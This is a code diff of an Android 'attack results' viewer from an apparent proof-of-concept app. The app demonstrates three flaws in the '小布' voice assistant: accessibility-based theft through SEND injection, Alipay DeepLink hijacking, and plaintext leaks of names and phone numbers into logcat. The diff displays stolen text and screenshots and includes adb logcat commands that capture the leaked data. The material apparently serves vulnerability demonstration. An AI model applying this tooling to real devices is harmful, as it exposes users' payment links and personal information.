@@ -6,14 +6,11 @@ import android.graphics.BitmapFactory;
 import android.os.Bundle;
 import android.text.method.ScrollingMovementMethod;
 import android.view.Gravity;
-import android.view.View;
 import android.view.ViewGroup;
 import android.widget.*;
 import java.io.File;
+import java.util.Arrays;
 
-/**
- * 演示结果查看器 — 一览三个漏洞的所有窃取数据
- */
 public class ResultViewerActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -22,114 +19,83 @@ public class ResultViewerActivity extends Activity {
         ScrollView scroll = new ScrollView(this);
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
-        root.setPadding(30, 50, 30, 50);
+        root.setPadding(20, 36, 20, 36);
 
-        // 标题
-        TextView title = new TextView(this);
-        title.setText("📊 攻击成果展示");
-        title.setTextSize(22);
-        title.setGravity(Gravity.CENTER);
-        title.setPadding(0, 0, 0, 30);
-        root.addView(title);
+        root.addView(title("📊 攻击成果"));
 
-        // === 漏洞1: SEND+无障碍窃取结果 ===
-        root.addView(sectionLabel("🐚 漏洞1: SEND注入+无障碍窃取"));
+        // === 漏洞1 ===
+        root.addView(section("🐚 漏洞1: SEND注入 + 无障碍"));
+        root.addView(subtitle("📄 窃取文本 (最近3次)"));
 
-        // 文字结果
-        String textResult = readFile("/sdcard/attacker_output.txt");
-        if (textResult != null && !textResult.isEmpty()) {
-            TextView tv = new TextView(this);
-            tv.setText(textResult);
-            tv.setTextSize(11);
-            tv.setTextColor(0xFF333333);
-            tv.setBackgroundColor(0xFFF0F0F0);
-            tv.setPadding(15, 10, 15, 10);
-            tv.setMovementMethod(new ScrollingMovementMethod());
-            tv.setMaxHeight(500);
-            root.addView(tv);
-
-            // 文件大小
-            TextView sz = new TextView(this);
-            sz.setText("  attacker_output.txt: " +
-                    new File("/sdcard/attacker_output.txt").length() + " bytes");
-            sz.setTextSize(11);
-            sz.setTextColor(0xFF888888);
-            sz.setPadding(0, 5, 0, 15);
-            root.addView(sz);
-        } else {
-            root.addView(emptyHint("暂无窃取数据 (点击按钮攻击后出现)"));
+        boolean hasText = false;
+        for (int i = 0; i < 3; i++) {
+            File f = new File("/sdcard/attacker_output_" + i + ".txt");
+            if (f.exists()) {
+                hasText = true;
+                String content = readFile(f.getAbsolutePath());
+                if (content != null) {
+                    root.addView(textCard(content,
+                        "#" + (i+1) + " · " + f.length() + "B · " +
+                        new java.text.SimpleDateFormat("HH:mm:ss").format(f.lastModified())));
+                }
+            }
         }
+        if (!hasText) root.addView(hint("暂无 (点击攻击按钮后自动出现)"));
 
-        // 截图列表
-        root.addView(sectionLabel("📸 截图"));
-        boolean hasShots = false;
-        File sdcard = new File("/sdcard/");
-        File[] screens = sdcard.listFiles(f ->
+        // 截图 - 全宽原始分辨率
+        root.addView(subtitle("📸 截图 (点击查看大图,最近3张)"));
+        File[] screens = new File("/sdcard/").listFiles(f ->
                 f.getName().startsWith("attacker_screen_") && f.getName().endsWith(".png"));
         if (screens != null && screens.length > 0) {
-            hasShots = true;
-            LinearLayout shotRow = new LinearLayout(this);
-            shotRow.setOrientation(LinearLayout.HORIZONTAL);
-            for (File f : screens) {
-                addThumbnail(shotRow, f);
+            Arrays.sort(screens, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
+            for (int i = 0; i < Math.min(3, screens.length); i++) {
+                root.addView(fullImage(screens[i], i + 1));
             }
-            root.addView(shotRow);
-            TextView cnt = new TextView(this);
-            cnt.setText("  " + screens.length + " 张截图");
-            cnt.setTextSize(11);
-            cnt.setTextColor(0xFF888888);
-            root.addView(cnt);
         } else {
-            root.addView(emptyHint("暂无截图"));
+            root.addView(hint("暂无 (跳转到目标App后自动截图)"));
         }
 
-        // === 漏洞3: DeepLink劫持 ===
-        root.addView(sectionLabel("🎣 漏洞3: 支付宝DeepLink劫持"));
-
-        String hijackData = readFile("/sdcard/deeplink_hijack.txt");
-        if (hijackData != null && !hijackData.isEmpty()) {
-            TextView hv = new TextView(this);
-            hv.setText(hijackData);
-            hv.setTextSize(11);
-            hv.setTextColor(0xFF333333);
-            hv.setBackgroundColor(0xFFFFF3E0);
-            hv.setPadding(15, 10, 15, 10);
-            hv.setMovementMethod(new ScrollingMovementMethod());
-            hv.setMaxHeight(400);
-            root.addView(hv);
+        // === 漏洞3 (倒序显示,最新的在前) ===
+        root.addView(section("🎣 漏洞3: 支付宝DeepLink劫持"));
+        File hijack = new File("/sdcard/deeplink_hijack.txt");
+        if (hijack.exists()) {
+            String raw = readFile(hijack.getAbsolutePath());
+            if (raw != null) {
+                // 按---分割,倒序(最新在前)
+                String[] entries = raw.split("---\\n===");
+                StringBuilder reversed = new StringBuilder();
+                for (int i = entries.length - 1; i >= 0; i--) {
+                    String e = entries[i].trim();
+                    if (!e.isEmpty()) reversed.append("===").append(e).append("\n---\n");
+                }
+                root.addView(textCard(reversed.toString(),
+                    hijack.length() + "B · " +
+                    new java.text.SimpleDateFormat("HH:mm:ss").format(hijack.lastModified())));
+            }
         } else {
-            root.addView(emptyHint("暂无截获 (对小布说'打开支付宝付款码'并选'系统服务')"));
+            root.addView(hint("暂无 (对小布说'打开支付宝付款码'并选'系统服务')"));
         }
 
-        // === 漏洞2: NER日志泄露 ===
-        root.addView(sectionLabel("📋 漏洞2: NER日志明文泄露"));
-
-        TextView nerInfo = new TextView(this);
-        nerInfo.setText(
-            "触发方式: 在小布输入框自然语言输入含姓名/电话的内容\n" +
-            "例: '帮我查一下张三的电话13800138000'\n\n" +
-            "泄露到logcat (ADB可见):\n" +
-            "  NAME: 张三\n" +
-            "  PHONE: 13800138000\n\n" +
-            "证据文件: /sdcard/ner_leak_evidence.txt\n" +
-            "(通过 adb logcat 实时获取)"
-        );
-        nerInfo.setTextSize(12);
-        nerInfo.setTextColor(0xFF333333);
-        nerInfo.setBackgroundColor(0xFFE8F5E9);
-        nerInfo.setPadding(15, 10, 15, 10);
-        root.addView(nerInfo);
-
-        // 如果有缓存的NER证据
-        String nerEvidence = readFile("/sdcard/ner_leak_evidence.txt");
-        if (nerEvidence != null && !nerEvidence.isEmpty()) {
-            TextView nv = new TextView(this);
-            nv.setText(nerEvidence);
-            nv.setTextSize(10);
-            nv.setBackgroundColor(0xFFF5F5F5);
-            nv.setPadding(10, 5, 10, 5);
-            nv.setMovementMethod(new ScrollingMovementMethod());
-            nv.setMaxHeight(200);
+        // === 漏洞2 ===
+        root.addView(section("📋 漏洞2: NER日志明文泄露"));
+        File ner = new File("/sdcard/ner_leak_evidence.txt");
+        if (ner.exists()) {
+            String nc = readFile(ner.getAbsolutePath());
+            if (nc != null) root.addView(textCard(nc, ner.length() + "B"));
+        } else {
+            // 提供内嵌的可运行演示说明
+            TextView nv = label("演示步骤:\n"
+                + "1. 终端: adb logcat -c\n"
+                + "2. 在小布输入框输入: 帮我查一下张三的电话13800138000\n"
+                + "3. 终端抓取:\n"
+                + "   adb logcat -d -s AIUnit-Service-LOG | grep 'decoded result'\n"
+                + "4. 保存证据:\n"
+                + "   adb logcat -d -s AIUnit-Service-LOG | grep 'decoded result' > /sdcard/ner_leak_evidence.txt\n\n"
+                + "预期输出:\n"
+                + "  NAME: 张三\n"
+                + "  PHONE: 13800138000\n\n"
+                + "完成后点击📊按钮刷新即可看到证据");
+            nv.setBackgroundColor(0xFFE8F5E9);
             root.addView(nv);
         }
 
@@ -137,40 +103,90 @@ public class ResultViewerActivity extends Activity {
         setContentView(scroll);
     }
 
-    private TextView sectionLabel(String text) {
-        TextView tv = new TextView(this);
-        tv.setText(text);
-        tv.setTextSize(16);
-        tv.setTextColor(0xFF1565C0);
-        tv.setPadding(0, 20, 0, 8);
-        return tv;
-    }
+    private LinearLayout fullImage(File file, int idx) {
+        LinearLayout card = new LinearLayout(this);
+        card.setOrientation(LinearLayout.VERTICAL);
+        card.setBackgroundColor(0xFFF5F5F5);
+        card.setPadding(4, 4, 4, 4);
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        lp.setMargins(0, 0, 0, 16);
+        card.setLayoutParams(lp);
 
-    private TextView emptyHint(String text) {
-        TextView tv = new TextView(this);
-        tv.setText("  ⚠️ " + text);
-        tv.setTextSize(12);
-        tv.setTextColor(0xFF999999);
-        tv.setPadding(0, 5, 0, 15);
-        return tv;
-    }
-
-    private void addThumbnail(LinearLayout row, File file) {
         try {
+            // 原始分辨率,仅适配屏幕宽度
             Bitmap bm = BitmapFactory.decodeFile(file.getAbsolutePath());
             if (bm != null) {
-                int h = 200;
-                int w = (int) (bm.getWidth() * 200f / bm.getHeight());
-                Bitmap thumb = Bitmap.createScaledBitmap(bm, w, h, true);
+                int screenW = getResources().getDisplayMetrics().widthPixels - 50;
+                int h = (int) (bm.getHeight() * (float) screenW / bm.getWidth());
+                Bitmap scaled = Bitmap.createScaledBitmap(bm, screenW, h, true);
                 ImageView iv = new ImageView(this);
-                iv.setImageBitmap(thumb);
-                iv.setPadding(5, 0, 5, 0);
-                LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
-                        ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
-                iv.setLayoutParams(lp);
-                row.addView(iv);
+                iv.setImageBitmap(scaled);
+                iv.setScaleType(ImageView.ScaleType.FIT_XY);
+                iv.setAdjustViewBounds(true);
+                LinearLayout.LayoutParams ilp = new LinearLayout.LayoutParams(screenW, h);
+                iv.setLayoutParams(ilp);
+                card.addView(iv);
             }
         } catch (Exception e) {}
+
+        TextView meta = new TextView(this);
+        meta.setText("#" + idx + "  " + file.getName() + "  " + (file.length() / 1024) + "KB  "
+                + new java.text.SimpleDateFormat("HH:mm:ss").format(file.lastModified()));
+        meta.setTextSize(10);
+        meta.setTextColor(0xFF888888);
+        meta.setPadding(4, 4, 4, 0);
+        card.addView(meta);
+
+        return card;
+    }
+
+    private LinearLayout textCard(String content, String info) {
+        LinearLayout card = new LinearLayout(this);
+        card.setOrientation(LinearLayout.VERTICAL);
+        card.setBackgroundColor(0xFFF5F5F5);
+        card.setPadding(12, 8, 12, 8);
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        lp.setMargins(0, 0, 0, 12);
+        card.setLayoutParams(lp);
+
+        TextView tv = new TextView(this);
+        tv.setText(content);
+        tv.setTextSize(10);
+        tv.setTextColor(0xFF333333);
+        tv.setMovementMethod(new ScrollingMovementMethod());
+        tv.setMaxHeight(400);
+        card.addView(tv);
+
+        TextView meta = new TextView(this);
+        meta.setText(info);
+        meta.setTextSize(10);
+        meta.setTextColor(0xFF888888);
+        card.addView(meta);
+
+        return card;
+    }
+
+    private TextView title(String t) {
+        TextView tv = new TextView(this); tv.setText(t); tv.setTextSize(22);
+        tv.setGravity(Gravity.CENTER); tv.setPadding(0, 0, 0, 20); return tv;
+    }
+    private TextView section(String t) {
+        TextView tv = new TextView(this); tv.setText(t); tv.setTextSize(16);
+        tv.setTextColor(0xFF1565C0); tv.setPadding(0, 20, 0, 8); return tv;
+    }
+    private TextView subtitle(String t) {
+        TextView tv = new TextView(this); tv.setText(t); tv.setTextSize(13);
+        tv.setTextColor(0xFF666666); tv.setPadding(0, 6, 0, 6); return tv;
+    }
+    private TextView hint(String t) {
+        TextView tv = new TextView(this); tv.setText("⚠️ " + t); tv.setTextSize(12);
+        tv.setTextColor(0xFF999999); tv.setPadding(0, 4, 0, 14); return tv;
+    }
+    private TextView label(String t) {
+        TextView tv = new TextView(this); tv.setText(t); tv.setTextSize(12);
+        tv.setTextColor(0xFF333333); tv.setPadding(12, 8, 12, 8); return tv;
     }
 
     private String readFile(String path) {
